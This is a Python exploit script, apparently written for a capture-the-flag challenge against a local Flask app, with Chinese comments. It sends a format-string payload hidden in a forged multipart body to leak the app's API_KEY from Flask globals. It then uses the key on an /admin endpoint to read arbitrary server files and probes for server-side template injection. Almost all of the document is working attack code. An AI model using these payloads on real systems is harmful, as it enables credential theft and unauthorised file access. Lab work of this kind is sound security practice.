import httpx

TARGET = "http://127.0.0.1:5000"
BOUNDARY = "---------------------------FlagBoundary123"

def get_api_key():
    fmt_payload = "{0.view_functions[action].__globals__[API_KEY]}"
    fake_action_part = (
        f'\r\n--{BOUNDARY}\r\n'
        f'Content-Disposition: form-data; name="action"; filename="action"\r\n'
        f'Content-Type: text/json\r\n\r\n'
        f'{{"type": "debug"}}\r\n'
    )
    text = fmt_payload + fake_action_part
    params = {'text': text, 'client': 'Content-Type', 'token': f'multipart/form-data; boundary={BOUNDARY}'}
    r = httpx.post(f'{TARGET}/heartbeat', data=params, timeout=10.0)
    return r.text.strip()

def read_file_via_admin(api_key, path):
    headers = {"Authorization": api_key}
    r = httpx.get(f"{TARGET}/admin", params={"tmpl": path}, headers=headers, timeout=30.0)
    return r.text, r.status_code

if __name__ == "__main__":
    api_key = get_api_key()
    print(f"[+] API_KEY: {api_key}")
    
    # 尝试读取 jinja2/filters.py - 这个文件包含大量 {{ }} 示例
    print("\n[*] Reading jinja2/filters.py...")
    content, code = read_file_via_admin(api_key, "/usr/local/lib/python3.13/site-packages/jinja2/filters.py")
    print(f"Status: {code}")
    
    if code == 200:
        # 文件成功读取，但 SSTI 会被触发吗？
        # 检查返回内容
        if '42.55' in content:  # 这是 filters.py 中的一个原始值
            print("[-] Raw file returned (no SSTI)")
        else:
            print("[!] SSTI might have been triggered!")
        print(f"Content preview: {content[:500]}...")
    elif code == 500:
        print("[!] 500 Error - SSTI triggered and failed")
        print(f"Error: {content}")
